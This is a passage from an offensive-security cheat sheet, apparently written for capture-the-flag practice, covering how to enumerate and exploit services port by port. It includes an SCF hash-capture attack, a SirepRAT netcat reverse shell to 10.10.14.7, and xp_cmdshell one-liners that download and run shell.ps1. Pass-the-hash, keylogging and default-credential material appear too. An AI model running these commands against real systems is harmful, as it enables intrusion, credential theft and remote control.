+						RPCBind is directly not a part of windows, but Microsoft's Endpoint mapper is based on RPCBind. So, i have decided to include it under "RPC" Section.
+				Enumeration/Exploitation:
+					Read AD Exploitation Sheet
+			Ident:(113)
+				Understanding Ident:
+				Enumeration:
+					We use this port to enumerate users. We basically pass port_number to it and it tells us which user is running that service
+					ident-user-enum:(apt install ident-user-enum)
+						Basics:
+						Usage:
+							ident-user-enum 192.168.1.100 22 113 139 445
+							ident-user-enum ip <port1> <port2> <port3> <port4>
+								port_n => the ports we got in nmap results
+			NTP(123):(Network Time Protocol)
+				Understanding NTP:
+				Enumeration:
+			MSRPC/RPC Endpoint Mapper:(135/593)
+				Basics:
+					Read Windows Internals Sheet
+				Enumeration/Exploitation:
+					Read AD Exploitation Sheet
+			NetBIOS(TCP-137/138/139,UDP-137/138/139):(Network Basic Input Output System)
+				Basics:
+					Read Windows Internals Sheet
+				NetBIOS Service-based Exploitation/Enumeration:(3)
+					A. NBNS:(aka NetBIOS-NS)(TCP/UDP 137)
+						Basics:
+							NBNS can be used to access NBT(NetBIOS Name Table). This can be used to enumerate system details such as hostname, domain information, etc.
+						Enumeration:
+							Using Windows:
+								NBTstat:
+									Basics:
+										Its used to query NetBT stats, as well as NetBIOS Name Table and NetBIOS Name Cache.
+									Usage:
+										nbtstat -A <ip> => Prints NBT table for remote host
+											Understanding Output:
+												<computer_name> <identifier> <> <>
+										Flags:
+											-a <hostname> => Prints NBT table for remote host
+											-A <ip> => Prints NBT table for remote host
+											-c => Display NBNS's cache
+											-n => Display local NetBIOS table
+											-r => Show NetBIOS name resolution stats
+											-R => 
+											-S => 
+											-s => 
+											-RR => 
+							Using Linux:
+								NBTScan:
+									Basics:
+										Advantages:
+											NBTScan, unlike NBTStat can scan multiple addresses.
+									Usage:
+										Passing Host(s):
+											nbtscan <host_ip> => Single Host
+											nbtscan 192.169.0.11/24 => Subnet
+										Flags:
+								NMBLookup:
+									Basics:
+									Usage:
+										Flags:
+						Exploitation:
+					B. NetBIOS-DGM:(TCP/UDP 138)
+						Basics:
+						Enumeration:
+						Exploitation:
+					C. NetBIOS-SSN:(TCP/UDP 139)
+						Basics:
+							It can be used to enumerate user details, shared folders, domain information, etc.
+						Enumeration:
+							Windows:
+								Net.exe:("net use" specifically)
+									Basics:
+									Usage:
+										net use \\ip\share_name /user
+										Flags:
+						Exploitation:
+							If we have creds:(Privileged User)
+								We can upload and download files, schedule and run arbitary commands, access and modify registry and read SAM.
+							If we dont have creds:
+								Bruteforcing:
+			SMB(137/138/139/445):(Server Message Block)
+				Basics:
+					Read Windows Internals Sheet.
+				Enumeration:
+					Methodology:
+						1. Use SMBMAP to discover which shares have R/W permission and Then, use SMBCLIENT to connect to the shares.
+						2. Mount SMB shares.
+					Mouting SMB shares:
+						Basics:
+							It means that we connect to the available shares. This attaches share like a directory.
+							When to mount:
+								When we have a lot of files/directories inside a share
+						Mount:(Binary)
+							Mounting Linux Shares:
+								mount //ip/sharename /mnt/abcd
+							Mounting Windows Shares:
+								mount -t cifs //ip/sharename /mnt/abcd => shares which are accessible by anonymous user
+								mount -t cifs -o 'username=abcd%pass' //ip/sharename /mnt => shares which require authenciation
+								mount -t cifs -o username=user1234,password=pass1234 //ip/sharename /mnt => shares which require authenciation
+								Flags:
+									-t cifs => windows protcol for mounting shares 
+							Note:
+								Read Linux Shell Commands Sheet to read more.
+					Unmounting SMB shares:
+						umount:
+							umount /mnt/abcd
+							Note:
+								Spelling is "umount" not "unmount".
+							Note:
+								Read Linux Shell Commands Sheet to read about umount.						
+					Tools:
+						SMBMap:
+							Basics:
+								It show SMB shares along with permissions.
+								Note:
+									SMBMap cannot take IPv6 as <ip>
+							Usage:
+								smbmap -H ip => show shares along with permissions
+								smbmap -u anonymous -H ip => anonymous login
+								smbmap -H ip -u null => anonymous login
+								smbmap -H ip -u null -p null => anonymous login
+								smbmap -u user -p pass ip -R sharename => see files
+								smbmap -u user -p pass ip -R sharename -A file => get "file"
+								smbmap -u user -p pass/hash -H ip -d domain
+								Flags:
+									-H =>  
+									-u => 
+									-p => 
+									-R => 
+									-d => 
+								Note:
+									Sometimes, smbmap dont work, in that case, use smbclient.
+						SMBClient:
+							Basics:
+								Its used for downloading/uploading files
+							Usage:
+								List shares:
+									smbclient -L ip => anonymous login
+									smbclient -L ip -u "" => anonymous login
+									smbclient -L ip -u '' => anonymous login
+									smbclient -L //ip/
+									smbclient -L <ip> -U 'user_name%password' => authenciated login
+									smbclient -U username //ip/sharename 'pass' => to get authenciated smb shell
+									smbclient //ip/sharename => List files in a share
+								Flags:
+									-L =>
+									-U =>
+								Meta-Commands:
+									put file.exe => To upload a file
+									get file.exe => To download a file
+									To download all the files and directories in a share:
+										smb> recurse on
+										smb> prompt off
+										smb> mget *
+										Note:
+											mget means "multiple get" and is used to download multiple files
+								Note:
+									//ip/ = ////ip// = ip
+						PTH-SMBClient:
+							Basics:
+								It's similiar to SMBClient, but accepts hash instead of password.
+							Usage:
+								pth-smbclient -U "AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A" //192.168.10.100/Share
+								pth-smbclient -U "AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A" //192.168.10.100/C$
+								Flags:
+									-U => 
+						SMBCacls:
+							Basics:
+								smbcacls is used to show info related to a share such as owner of share and who can write to share and a folders in it
+							Usage:
+								smbcacls -N //ip/share_name /folder_name => show permissions
+								FLags:
+									-N => 
+								Automating it:
+									mount the share
+									cd /mnt
+									for i in  $(ls); do echo $i; smbcacls -N  //ip/share_name $i; done;
+				Exploitation:
+					SCF File Attack:(used in HTB::Sizzle)
+						Basics:
+							We need write access in share for this attack
+							We will upload a SCF file to the share and run responder. As soon as a user will open the share, the scf file get executed automatically and user will be forced to authenciate with us, thus giving ntlmV2 hash which the responder will capture.
+						Exploitation:
+							Creating a SCF file:(Shell Command File)
+								[Shell]
+								Command=2
+								IconFile=\\attackers_ip\tools\nc.ico
+								[Taskbar]
+								Command=ToggleDesktop
+							Using responder:
+								responder -I tun0
+								Note:
+									To read more about Responder tool => Read AD Exploitation Sheet
+							Cracking hash:
+								hashcat -m 5600 file.hash /usr/share/wordlists/rockyou.txt --force
+			SNMP(UDP/161):(Simple Network Management Protocol)
+				Understanding SNMP:
+					Basics:
+						Its used for collecting & exchanging management information between network devices, such as, routers, switches, servers, printers, etc in order to monitor the network devices.
+						Versions:
+							SNMPv1:
+								It uses community strings for authentication.
+								It uses UDP only.
+							SNMPv2:(aka SNMPv2c)
+								It uses community strings for authentication.
+								It uses UDP but can be configured to use TCP.
+							SNMPv3:
+								It uses MD5 or SHA hash for authentication and DES-56 for privacy.
+								It uses TCP only.
+						Components:(4)
+							A. Managed Devices:
+								Basics:
+									Managed Device refers to a network nodes, such as printers, routers, switches, etc that have SNMP enabled for either unidirectional(read) or bidirectional(read/write) communication.
+									These devices exchange node-specific information with NMSs.
+							B. SNMP Agent:
+								Basics:
+									Its a program installed on a managed device responsible for collecting management information, converting that management information into SNMP-compatible format and making it available to SNMP Manager.
+							C. NMS:(Network Management System)(aka Network Management Station)(aka SNMP Manager)
+								Basics:
+									NMS is a centralizied system responsible for managing & communicating with SNMP Agents. One or more NMS may exist in a network.
+									Note:
+										SNMP Manager is a computer thats used to run one or more NMSs in a network.
+								Functions:
+									Query SNMP agents
+									Set variables in agents
+							D. 	MIB:(Management Information Base)(aka MIB Tree)
+								Basics:
+									MIB is a virtual hierarchical tree-like database hosted by every SNMP Agent and is shared with SNMP Manager.
+									MIB is SNMP Manager uses this db to request SNMP Agent for specifc information.
+								Structure:
+									Objects & OID(Object ID):
+										Basics:
+											MIB contains "Managed Objects" having unique OID.
+										Types:(2)
+											1. Scalar OID:
+												Scalar OID is given to Scalar Objects. Scalar Object define a single object instance, for example device’s vendor name, etc.
+											2. Tabular OID:
+												Tabular OID is given to Tabular Objects. Tabular object defines multiple related object instance that are grouped together in MIB tables, for example, CPU utilization.
+						Community Strings:(aka SNMP String)
+							Basics:
+								Its used by a device for accessing MIB data from other managed devices and is only available in SNMPv1 and SNMPv2.
+							Types:(3)
+								A. Read-Only:
+									Basics:
+										This string allows access to MIB objects on a read-only basis.
+									Default Value => "Public"
+								B. Read-Write:
+									Basics:
+										This string allows access to MIB objects on a read-write basis.
+									Default Value => "Private"
+								C. SNMP Trap:(SNMPv2 Only)
+									Basics:
+					SNMP Commands:
+						GET:
+							GET is a request sent by SNMP Manager to Managed Device to retrive one or more objects.
+						GET NEXT:
+							GET NEXT is a request sent by SNMP Manager to Managed Device to retrive value of the next OID in MIB.
+						GET BULK:
+							GET BULK is used to retrive a lot of data from large MIB Trees.
+						SET:
+							SET is used by Manager to modify or assign value to Managed device.
+						TRAPS:
+							TRAPS is used by Agents by signal the SNMP Manager in case of some event.
+						INFORM:
+							INFORM is used by Agents 
+						RESPONSE:
+							RESPONSE is used by Manager in response to TRAPS commands to provide signal of action to Agents.
+				Enumeration:
+					Bruteforcing Communities:
+						OneSixtyOne:
+							Basics:
+								Its faster than hydra.
+							Usage:
+								onesixtyone -c wordlist.txt <ip>
+								Flags:
+									-c => 
+						Hydra:
+							hydra -P wordlist.txt <ip> snmp
+						Wordlists:
+							/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt
+							/usr/share/seclists/Discovery/SNMP/snmp_onesixtyone.txt
+					SNMPWalk:
+						Basics:
+							SNMPWalk is a tool used to query MIB values to extract information about managed devices.
+						Usage:
+							snmpwalk -c <community string> -t 10 -v<version_number> <ip> => it will give an OID number
+								if output is "NO RESPONSE" => the given string is wrong
+							snmpwalk -c public -v<version> <ip> OID_number => enumerate users
+							Flags:
+								-c <string> => community string
+								-v => SNMP version
+								-t => 
+					SNMP-Check:
+						Basics:
+							It shows Output in a better way than snmpwalk
+						Usage:
+							snmp-check -c public <ip>
+							Flags:
+								-c => 
+						Note:
+							"snmp-check" and "snmpcheck" are completely different programs and snmpcheck dont work properly, but snmp-check works properly.
+			IRC(194/6697/6660-7000/8067):(Internet Relay Chat)
+				Understanding IRC:
+				Enumeration:
+					Connecting to IRC:
+				Exploitation:
+					unreal ircd 3.2.8.1:(HTB::irked)
+						https://github.com/MrMafiaP/PwnHouse/tree/master/CVE-2010-2075	
+			LDAP(389/636/3268/3269):(Lightweight Directory Access Protocol)
+				Basics:
+					Read Windows Internals Sheet
+				Enumeration:
+					Read AD Exploitation Sheet
+			RTSP(554/8554):(Real Time Streaming Protocol)
+				Understanding RTSP:
+				Enumeration:
+			Rsync:(873)
+				Understanding Rsync:
+					Its like a file sharing service
+				Enumeration:
+					Netcat:
+						nc -nv <ip> 873
+							Meta-commands:
+								#list => list shares
+
+								Note:
+									"#" is a part of command
+					Rsync:(Binary)
+						Basics:
+							Rsync is used to connect to the shares.
+						Usage:
+							rsync -av --list-only rsync://ip/share_name => lists files
+							rsync -av --list-only rsync://ip/share_name ./rsyncfiles => mounting the rsync share
+							rsync -a --relativ => to upload the files 
+							Flags:
+								-a => 
+								-v => 
+								--list-only => 
+								--relativ => 
+			SOCKS(1080):(Socket Secure)
+				Understanding SOCKS:
+					SOCKS Protocol:
+						Basics:
+							SOCKS is a layer 5(Session layer of OSI model) proxying internet protocol that creates a TCP connection to a server on behalf of client, and then exchange network packets between the client and server. In other words, it creates a tunnel over the protocol. However, SOCKS cannot be used to tunnel protocols which operate below layer 5 of OSI model, thus can only be used for protocols like HTTP, HTTPS, POP3, SMTP and FTP, etc.
+							Ports:
+								TCP/1080
+							Versions:
+								SOCKs4:
+								SOCKs4a:
+									Basics:
+										Its an extension of SOCKs4.
+									Advatanges:
+										1. Allows usage of domainnames instead of IP
+										2. 
+								SOCKs5:
+									Basics:
+									Advatanges:
+										1. Encryption:
+											SOCKs5 use SSH encrypted tunnel.
+										2. Authentication:
+											SOCKs5 support authentication.
+										3. IPv6 Suppot:
+										4. UDP Proxies:
+											SOCKs5 support UDP proxies.
+					Working:
+						SOCKS works in two steps:
+							1. SOCKS is a tunneling protocol:
+								SOCKS create a tunnel by setting up SOCKS server.
+							2. SOCKS is a proxying protocol:(optional)
+								SOCKS uses that tunnel's end-point as a proxy.
+						Example:
+							1. Setting up the tunnel:
+								ssh -NfD 9050 root@10.0.0.1  => This set a tunnel from my_box:9050 to 10.0.0.1 This wont give any shell(bcoz of a flag we used)
+							2. Using tunnel as a proxy:
+								Proxychains:
+									Edit proxychains:
+										127.0.0.1 9050 (that is our end of tunnel)
+									proxychains firefox
+					SOCKS Proxy:
+						Advantages:
+							Firewall
+						Disadvantages:
+							HTTP proxy handle HTTP requests better than SOCKS proxy
+				Creating SOCKS Proxy:
+					https://github.com/Bonveio/socks5-debian
+					https://www.hackingarticles.in/penetration-testing-lab-setup-microsocks/
+					Shadowsocks
+				Enumeration:
+				Exploitation:
+			Node-Red:(1880)
+				Understanding Node-Red:
+					NodeRed is a browser based editor to make flows for IoT devices and other technology to talk together	
+				Used in HTP::Frolic,HTB::Reddish
+			NFS(2049):(Network File Server)
+				Understanding NFS:
+				Enumeration:
+					Nmap:
+						nmap -p 111 --script nfs* ip => it will run all scripts related to nfs
+					Showmount:
+						Basics:
+						Usage:
+							showmount -e <IP> => show mountable folders
+							Flags:
+								-e => 
+					Mounting Shared Folders:
+						Mount:(Binary)
+							mount -t nfs <ip>:/<remote_folder> <local_folder> -o nolock => for win/lin
+							Note:
+								Read Linux Shell Commands Sheet to read more.
+				Exploitation:
+					If NFS is not configured correctly, users can upload arbitrary files (such as SSH keys) and gain access on the system.
+			Docker:(2375/2376)
+				Understanding Docker:
+				Enumeration:
+			ISCSI(3260):(Internet Small Computer Systems Interface)
+				Understanding ISCSI:
+				Enumeration:
+					Nmap:
+						nmap -sV --script=iscsi-info -p 3260 ip
+			SAPRouter:(3299)
+				Understanding SAPRouter:
+				Enumeration:
+			RDP(3389):(Remote Desktop Protocol)
+				Understanding RDP:
+				Connecting to RDP:
+					Rdesktop:
+						Basics:
+						Usage:
+							rdesktop <ip> -g 1900x600
+							Flags:
+								-g => 
+						Note:
+							sometimes, it causes issues, in that case use another tool
+					xFreeRDP:
+						Basics:
+						Usage:
+							xfreerdp /v:ip:port /u:username /p:password
+							Flags:
+								/v:<ip:port> => IP
+								/u:<user_name> or <domain_name>/<user_name> or <user_name>@<domain_name>
+								/d:<domain_name>
+								/p:<password>
+								/pth:<hash_for_pth>
+			SVN(3690):(Subversion)
+				Understanding Subversion:
+				Enumeration:
+			WS-Discovery(3702):(Web Services Discovery Protocol)
+				Understanding WS-Discovery:
+				Enumeration:
+			EPMD(4369):(Erlang Port Mapper Daemon)
+				Understanding EPMD:
+				Enumeration:
+			mDNS(5353):(Multicast DNS)
+				Understanding mDNS:
+				Enumeration:
+				Exploitation:
+			LLMNR:(5355)
+				Basics:
+					Read Windows Internals Sheet
+				Enumeration/Exploitation:
+					Read NTLM Attacks Section of AD Exploitation Sheet
+			ADB(5555):(Android Debug Bridge)
+				Understanding ADB:
+				Enumeration:
+			Kibana:(5601)
+				Understanding Kibana:
+				Enumeration:
+			VNC(5800/5801/5900.5901):(Virtual Network Computing)
+				Understanding VNC:
+					Its like RDP
+					VNC Key Authentication:
+				Enumeration:
+					Connecting to it:
+						VNCViewer:
+							Basics:
+							Usage:
+								vncviewer -passwd pass.txt <ip:port>
+								Flags:
+									-passwd => 
+				Exploitation:
+					Decrypting VNC password:
+						Read Password Cracking And Cryptography Sheet
+			WinRM(5985/5986):(Windows Remote Management)
+				Basics:
+					Read Windows Internals Sheet
+				Connecting to Winrm:
+					Evil-WinRM:(gem install evil-winrm)
+						Basics:
+						Usage:
+							evil-winrm -u user -p 'pass' -i ip -p port
+							evil-winrm -u user -H nt_hash -i ip -s /scripts => /scripts folder will contain ps1 scripts and we can directly import them
+							evil-winrm -u user -H nt_hash -i ip
+							Meta-Commands:
+								menu => show commands and modules of any loaded powershell scripts
+								Dll-Loader => 
+								Donut-Loader => 
+								Invoke-CommandAs => 
+								Invoke-ScheduledTask => 
+								Invoke-binary file.exe => 
+								Bypass-4MSI => bypasses AMSI
+									AMSI blocks binary execution
+								.ps1 Meta Commands:
+									Module names of the scripts we load in memory
+							File Transfers:
+								-s flag = .ps1 scripts
+								Inoke-Binary
+								upload local_filename destination_filename => upload file to victim
+									local files can be auto-completed using tab key. It is not needed to put a remote_path if the local file is in the same directory from which evil-winrm is invoked.
+								download remote_filename destination_filename => download from victim to us
+									it is not needed to set local_path if the remote file is in the current directory.
+							Flags:
+								-i =>
+								-u =>
+								-p =>
+								-H =>
+								-s =>
+					Crackmapexec:
+						crackmapexec winrm ip -u 'user' -p 'pass' -x command 
+			X11(6000):(aka X Window System)
+				Understanding X11:
+					Like RDP
+				Enumeration:
+					Finding info like screen size, window id
+					Connecting to it:
+						xrdp:(apt-get install x11-utils xutils-dev imagemagick libxext-dev xspy)
+							Basics:
+							Usage:
+								xrdp <ip>
+								Flags:
+					xWinInfo:
+						Basics:
+						Usage:
+							xwininfo -root -display <ip>
+							Flags:
+								-root => 
+								-display => 
+				Live Streaming:
+					Its different than connecting to it as here, we just see whats going on the screen.
+					xwatchwin:
+						Basics:
+							Installation:
+								wget http://www.ibiblio.org/pub/X11/contrib/utilities/xwatchwin.tar.gz
+								tar zxvf xwatchwin.tar.gz
+								cd xwatchwin/
+								xmkmf && make && make install
+						Usage:
+							xwatchwin <ip> -w <window_id>
+							Flags:
+								-w => 
+									window_id can be found by using xwininfo
+				KeyLogging:
+					Xspy:
+						Basics:
+						Usage:
+							xspy <ip>
+							Flags:
+			BitTorrent:(UDP/6881)
+				Understanding BitTorrent:
+					Basics:
+						Ports:
+							UDP/6881
+			AJP(8009):(Apache JServ Protocol)
+				Understanding AJP:
+					Its an optimized version of the HTTP protocol to allow a standalone web server such as Apache to talk to Tomcat.
+				Enumeration:
+					Nmap:
+						nmap -sV --script ajp-auth,ajp-headers,ajp-methods,ajp-request -n -p 8009 <IP>
+				Exploitation:
+					CVE-2020-1938:(aka Ghostcat)
+						LFI vulnerability
+						Vulnerable versions:
+							Apache Tomcat 9	=> 9.0.30 and below
+							Apache Tomcat 8	=> 8.5.50 and below
+							Apache Tomcat 7	=> 7.0.99 and below
+						https://github.com/00theway/Ghostcat-CNVD-2020-10487:
+							python3 ajpShooter.py http://10.10.10.78:8080 8009 /WEB-INF/web.xml read
+			Splunk:(8089)
+				Understanding Splunk:
+				Enumeration:
+				Exploitation:
+			HTTP/HTTPS:(80/81/443/8080/8443)
+				Read WebApp Pentesting For CTF Sheet
+			dRuby:(8787)
+				Understanding dRuby:
+				Exploitation:
+					dRuby RMI Server 1.8 Exploitation:(CVE-2011-5330)
+						Metasploit:
+							exploit/linux/misc/drb_remote_codeexec
+						Manual:
+							Not yet found on google.
+							We can edit the msf exploit and run it manually => accepted in OSCP
+			ElasticSearch:(9200)
+				Understanding ElasticSearch:
+				Enumeration:
+			NDMP(10000):(Network Data Management Protocol)
+				Understanding NDMP:
+				Enumeration:
+			MemCached:(11211)
+				Understanding MemCached:
+					Memcached is a general-purpose distributed memory caching system. It is often used to speed up dynamic database-driven websites by caching data and objects in RAM to reduce the number of times an external data source (such as a database or API) must be read.
+				Enumeration:(sudo apt install libmemcached-tools)
+					Nmap:
+						nmap -n -sV --script memcached-info -p 11211
+					MemcStat:
+						Basics:
+						Usage:
+							memcstat --servers=ip => Get stats
+							Flags:
+								--servers => 
+					MemcDump:
+						Basics:
+						Usage:
+							memcdump --servers=ip => Get all items
+							Flags:
+								--servers => 
+					MemcCat:
+						Basics:
+						Usage:
+							memccat --servers=ip <item1> <item2> <item3> => Get info inside the items
+							Flags:
+								--servers => 
+			SIREP:(29817/29819/29820)
+				Understanding SIREP:
+					Windows IOT
+				Exploitation:
+					https://www.woprsummit.org/slides-archive/SirepRAT_RCEasSYSTEMonWindowsIoTCore-WOPRSummit.pdf
+					SirepRAT:(https://github.com/SafeBreach-Labs/SirepRAT)
+						Basics:
+						Usage:
+							./SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args "/c //10.10.14.7/abcd/nc64.exe -e cmd.exe 10.10.14.7 443"
+							Flags:
+								--return_output => 
+								--as_logged_on_user => 
+								--cmd => 
+								--args => 
+				Used in HTB::omni
+			BACNet(47808):(Building Automation and Control Network)
+				Understanding BACNet:
+				Enumeration:
+			Hadoop:(50030/50060/50070/50075/50090)
+				Understanding Hadoop:
+				Enumeration:
+		Shell PPS:
+			SSH(22):(Socket Secure Shell)(aka Secure Shell)
+				Understanding SSH:
+					SSH Service:
+					SSH Protocol:
+						Basics:
+							SSH is a cryptographic network layer protocol that uses public-key cryptography for providing secure communication and is used mainly for remote login, created as a replacement for Telnet/RSH/RLogin/Rexec Protocols in 1995.
+							SSH works on a server-client model:
+								SSH Server:
+									The system we connect to.
+								SSH Client:
+									A client is who connects to the ssh server. 
+									Client> ssh user_on_server@server_ip
+							SSH operates in 3 Layers:
+								A. Transport Protocol:
+									At this layer, SSH provides CIA
+								B. Authentication Protocol:
+									At this layer, SSH helps user validation
+								C. Connection Protocol:
+							Ports:
+								TCP/22
+								UDP/22
+							Versions:
+								SSH-1:
+									SSH-1 was relased in 1995.
+								SSH-2:(aka Secsh)
+									SSH-2 was relased in 2006 and had better security.
+						Authenciation Mechanisms:
+							SSH Key-Based Authenciation:
+						Advantages:
+							1. Encrypted Communication/Tunnels.
+						Applications:
+							1. Remote access:
+							2. Tunneling:
+								Read Lateral Movement and Pivoting Sheet
+							3. SOCKs Proxy:
+					SSH-Based Protocols:
+						SFTP:(SSH File Transfer)
+						SCP:(Secure Copy)
+				Enumeration:
+					Connecting to SSH Server:
+						SSH:(Binary)
+							ssh user@<host>
+							Note:
+								Read SSH(Binary) Section to know more.
+				Exploitation:
+					Key-Based Authentication Exploits:
+						Do we have Private Key?
+							if this key has passphrase:
+								ssh2john key.ssh > ssh.hash
+								john ssh.hash --wordlist=a.txt =>  it will proivde passphrase
+							chmod 600 key_name
+							ssh -i id_rsa <user>@ip
+								Enter Pasphrase
+						Do we have a low level shell and can upload files in /home directory of user:
+							Step-1: Generate our private and public key:
+								generating key:(id_rsa)
+									ssh-keygen -t rsa => it will give us two files:
+										id_rsa => private key, we can apply passphrase too. We use it to SSH to the server.
+											/home/.ssh/id_rsa
+										id_rsa.pub => public key
+											/home/.ssh/id_rsa.pub
+											This public key is later stored on server
+									chmod 600 id_rsa
+							Step-2: Upload id_rsa.pub to /home/user_name/.ssh/authorized_keys(victim)
+							Step-3: ssh -i id_rsa user_name@ip
+					Shellshock:(CVE-2014-6278/6271)
+						Read ShellShock Sheet
+				Tools:
+					SSH:(Binary)(aka OpenSSH-Client)
+						Basics:
+							Algorithms Supported:
+							Config File:(/etc/ssh/sshd_config)
+								Basics:
+						Usage:
+							Password-Based Login:
+								ssh <user_name>@<host> =>
+								ssh -l <user_name> <host>
+							Key-Based Login:
+								ssh -i <private_key> <user_name>@<host>
+								Note:
+									"private_key" must have "600" permission set to it.
+							Using Disabled Authenciation Algorithms:(HTB::Sunday)
+								How to know if SSH Server only supports outdated SSH authenciation algorithms:
+									We may come across some box which may use legacy(outdated) protcols.
+									ssh user@ip => got error
+										"Unable to negotiate no matching key exchange method found. Their offer: gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1"
+								ssh -oKexAlgorithms=diffie-hellman-group1-sha1 user@ip
+							Execute command after login:(one-liner)
+								ssh <user_name>@<host> <command_to_execute>
+								ssh <user_name>@<host> '<command_to_execute>'
+							Tunneling:
+								A. Local port forwarding:(ssh -L)
+									Basics:
+										It refers to forward a port from the client machine to the server machine. Basically, the SSH client listens for connections on a configured port, and when it receives a connection, it tunnels the connection to an SSH server. 
+										Here, a port is opened on our local machine and traffic sent to that port is forwarded to a port on the remote side
+									Exploitation:
+										ssh user@192.168.1.50 -L 1234:localhost:80
+											sets up a local portforward on kali on TCP port 1234 to port 80 of 192.168.1.50
+											Now, Attacker can goto 127.0.0.1:1234 to access the victim's webserver
+								B. Reverse Port Forwarding:(ssh -R)
+									Basics:	
+										Here, a port is opened on the remote side and traffic sent to that port is forwarded to a port on our local machine
+									Exploitation:
+										Edit Config file:
+											edit etc/ssh/sshd_config:
+												add "GatewayPorts clientspecified"
+											systemctl restart ssh
+										ssh user@192.168.1.50 -R 8080:localhost:80
+											This allows anyone on the remote server to connect to 8080 on the remote server to connect to port 80 of us(Attacker(kali)).
+								C. Dynamic port forwarding:(ssh -D)
+									Basics:
+							Flags:
+								-1 => Use SSH-1 only
+								-2 => Use SSH-2 only
+								-4 => Use IPv4 only
+								-6 => Use IPv6 only
+								-l <user_name> => loginname
+								-p <port> => Port to connect to
+								-i <private_key> => Private key
+								-f => Moves SSH session to background as soon as session is achieved
+								-oKexAlgorithms=<algorithm_name> => enable a key exchange algorithm that is disabled by default
+								-L => Local Port Forwarding
+								-D => Dynamic Port Forwarding
+									Used for SOCKS
+								-R => Reverse Port Forwarding
+								-J => 
+								-b <ip>
+									'-b' stands for bind address and is used to specify which client's IP address to use to connect to the host. This is mostly used when client has more than one IP address.
+								Special Flags:
+									-oKexAlgorithms
+										Couldn't find any refernce in man pages. However, the following link had it:
+											https://unix.stackexchange.com/questions/340844/how-to-enable-diffie-hellman-group1-sha1-key-exchange-on-debian-8-0
+						Issues:
+							1. It only allows to pass password in the interactive-console. This may not work well if password is too complex, that is, contains special symbols.
+					SSH-Keygen:
+						Basics:
+						Usage:
+							ssh-keygen -t rsa => it will give us two files:
+								id_rsa => private key, we can apply passphrase too.
+									/home/.ssh/id_rsa
+								id_rsa.pub => public key
+									/home/.ssh/id_rsa.pub
+							Flags:
+								-t => Algo_type
+								-f => Key_name(default name => id_rsa)
+								-b => 
+								-C => 
+								-r => 
+					SSHPass:
+						Basics:
+						Usage:
+							sshpass -p 'password' ssh user@ip
+							sshpass -p '&<h5b~yK3F#{PaPB&dA}{H>' ssh waldo@10.10.10.187
+							Flags:
+								-p => 
+			Telnet:(23)
+				Understanding Telnet:
+				Enumeration:
+					Telent:(Binary)
+						telnet ip
+						Flags:
+				Exploitation:	
+					Bruteforcing:
+						Hydra:
+							hydra -L user.txt -P pass.txt telnet://<ip> -t 4
+			Rexec:(512)
+				Understanding Rexec:
+					It allows to execute a command inside a host if you know valid credentials.
+				Enumeration:
+			Rlogin:(513)
+				Understanding Rlogin:
+					This service was mostly used in the old days for remote administration but now because of security issues this service has been replaced by the slogin and the ssh.
+				Enumeration:
+					Rlogin:(apt-get install rsh-client)
+						Basics:
+						Usage:
+							rlogin <IP> -l <username>
+							Flags:
+								-l => 
+			RSH:(514)
+				Understanding RSH:
+					RSH is like SSH.
+				Enumeration:
+					RSH:(Binary)
+						Basics:
+						Usage:
+							rsh <ip> -l user <command>
+							Flags:
+								-l => 
+		DataBase PPS:
+			MS-SQL:(1433)
+				Understanding MS-SQL:
+				Enumeration & Exploitation:
+					DBeaver:(GUI)
+						Installation:
+							apt-get install dbeaver
+					Mssqlclient.py:(CLI)
+						Basics:
+							Its a part of impacket-toolkit. It provides sql shell for MS-SQL.
+							Aside from being able to interact with the SQL server, it provides not one, but two ways to execute system commands:
+								xp_cmdshell:
+									Its an optional feature of MS-SQL servers that allows to spawn a system shell and execute commands. It is disabled by default, but you may find it enabled on older versions of MS-SQL. Or if you have a high-privilege user, you can enable the xp_cmdshell and then use it to run commands.
+									We can use Impacket’s mssqlclient.py tool to connect to and interact with MS-SQL servers and use the xp_cmdshell Commands are executed with the privileges of the SQL service account.
+										SQL> enable_xp_cmdshell
+										SQL> disable_xp_cmdshell
+										SQL> xp_cmdshell SOMECOMMAND
+										Getting a shell:
+											SQL> xp_cmdshell "powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.45:5555/shell.ps1')"
+								sp_start_job:
+									sp_start_job command can be used to start SQL jobs, but it can also be abused to execute system commands. It’s important to note that this feature results in blind command execution, i.e. you don’t get any output back, so it’s important to build your commands and one-liners correctly. Commands are executed with the privileges of the SQL service account.
+										SQL> sp_start_job SOMECOMMAND
+						Usage:	
+							mssqlclient.py username@ip
+							Flags:
+								-windows-auth:
+									sometimes it dont work, then use "-windows-auth" flag
+					SQSH:
+						Basics:
+							Sometimes, mssqlclient make issues, then use this
+							Used in HTB::Tally
+						Usage:
+							sqsh -S 10.10.10.59 -U sa -P "GWE3V65#6KFH93@4GWTG2G"
+							Enabling xp_cmdshell:
+								EXEC sp_configure 'show advanced options', 1;
+								go
+								RECONFIGURE; 
+								go
+								EXEC sp_configure 'xp_cmdshell', 1;
+								go
+								RECONFIGURE;
+								go
+							Now, we can use xp_cmdshell:
+								xp_cmdshell 'whoami';
+								go
+								getting a shel:
+									xp_cmdshell "powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.45:5555/shell.ps1')"
+									go
+							Flags:
+								-S => 
+								-U => 
+								-P => 
+							Meta-Commands:
+					Note:
+						Getting NTLMv2 hash of mssql_svc using responder and mssqlclient.py:(used in HTB::Giddy) Covered in Sql Injection Sheet.
+			OracleDB:(1521-1529)
+				Understanding OracelDB:
+					Ports:
+						1521 => Oracle TNS Listener 
+						1522-1529 =>
+						1748 => Oracle TNS Listener 
+					SID:(Service Identifier)
+						SID is the db name. Depending on the install flavor, there may be one or more default SIDs, or even a totally custom dba defined SID.
+					Accounts:
+						Once, we have the sid, we use it to gather user information.
+						Default Creds:
+							scott:tiger
+							DBSNMP/DBSNM
+							SYS/CHANGE_ON_INSTAL
+							PCMS_SYS/PCMS_SYS
+							WMSYS/WMSYS
+							OUTLN/OUTLN
+							Note:
+								Try combination:
+									uppercase:uppercase
+									uppercase:lowercase
+									lowercase:uppercase
+									lowercase:lowercase
+						sysdba:(system database administrator)
